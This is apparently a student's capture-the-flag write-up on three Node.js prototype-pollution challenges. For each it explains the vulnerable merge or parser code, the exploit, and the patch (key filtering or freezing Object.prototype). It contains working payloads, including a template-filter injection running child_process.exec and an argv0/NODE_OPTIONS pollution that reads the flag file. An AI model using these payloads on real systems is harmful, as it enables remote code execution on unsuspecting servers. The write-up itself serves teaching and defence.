# Solve:

## babyproto1:

### Where is the vulnerability and why it occurs

The problematic code is the deep merge function:
```javascript
function deepMerge(target, source) {
    let output = Object.assign({}, target);
    if (isObject(target) && isObject(source)) {
        for (let key in source){
            if(source.hasOwnProperty(key)){
                if(isObject(source[key])){
                    deepMerge(target[key], source[key])
                }else{
                    target[key] = source[key]
                }
            }
        }
    }
    return output;
}
```
In this function, it uses `target[key] = source[key]` to assign the value of `source[key]` to `target[key]`. 
However, if the target is something like `__proto__`, then it will pollute all objects. For example, 
in this case, `__proto__.flag = polluted`.

### How to exploit the vulnerability and retrieve the flag

- To trigger the vulnerability, we can input the following into the input boxes,
where locationID is `__proto__`, and the custom key is `flag`, and the custom value is `polluted`.
This would create the data package looking like  (`1` are just placeholders)::
```json
{
    "__proto__": {
        "name": "1",
        "AQ": "1",
        "latitude": "1",
        "longitude": "1",
        "flag": "polluted"
    }
}
```
- To retrieve the flag, simply append `/flag` to the url.

### How the .patch file works

The patch works by adding a check to the `deepMerge` function to prevent prototype pollution.
```javascript
if (key === "__proto__" || key === "constructor" || key === "prototype") {continue;}
```
The check is done by checking keywords like `__proto__` or `constructor` or `prototype`,
and will skip the current iteration of the loop to prevent the pollution.

## toddlerproto2:

### Where is the vulnerability and why it occurs

The problematic code is the deep merge function:
```javascript
function deepMerge(target, source) {
    let output = Object.assign({}, target);
    if (isObject(target) && isObject(source)) {
        for (let key in source){
            if(source.hasOwnProperty(key)){
                if(isObject(source[key])){
                    deepMerge(target[key], source[key])
                }else{
                    target[key] = source[key]
                }
            }
        }
    }
    return output;
}
```
In this function, it uses `target[key] = source[key]` to assign the value of `source[key]` to `target[key]`.
However, if the target is something like `__proto__`, then it will pollute all objects.
In this case, `__proto__.defaultFilter`.
The template engine will be polluted, and 
we can execute arbitrary code by calling the `defaultFilter` as the engine is rendering.

### How to exploit the vulnerability and retrieve the flag

- To trigger the vulnerability, we can input malicious code into the input boxes
that would create the data package looking like this (`1` are just placeholders):
```json
{
    "__proto__": {
        "name": "1",
        "AQ": "1",
        "latitude": "1",
        "longitude": "1",
      "defaultFilter": "e')); process.mainModule.constructor._load('child_process').exec('touch touch.txt');//"
    }
}
```
- We then rerender the page
- To retrieve the flag, simply append `/flag` to the url.

### How the .patch file works

The patch uses `Object.freeze(Object.prototype)` at the beginning of the app
to prevent prototype pollution.

## my-sis-system:

### Where is the vulnerability and why it occurs

The vulnerability is the ION parser.
```javascript
set(key, val) {
    let keyElements = splitElements(key);
    key = keyElements.pop();
    let elements = this.getFullScope(keyElements);
    let data = getTable(this.data, elements);
    if (typeof data == 'string')
        return data;
    data[key] = val;
}
```
There is no checks for keys like `__proto__`, `constructor`,
or `prototype`, which may lead to prototype pollution like the previous two challenges.
And since the server uses `child_process.spawn()` to restart when error happens, 
we can pollute argv0 and NODE_OPTIONS to execute arbitrary code.

### How to exploit the vulnerability and retrieve the flag

To trigger the vulnerability, I sent a `POST` request to the `/login` with the following body:
```text
title = "userData"

[__proto__] 
argv0 = "require('child_process').exec('cat ./flag.txt > ./public/pages/empty.html', {shell: '/bin/bash'},(error, stdout, stderr) => {if (error) {console.error('RCE');return;}})//"
NODE_OPTIONS = "--require /proc/self/cmdline"
```
This allows me to modify the content of empty.html to the content of the flag, and then I can retrieve the flag by visiting `/empty`.

### How the .patch file works

The patch uses `Object.freeze(Object.prototype)` at the beginning of the app
to prevent prototype pollution.


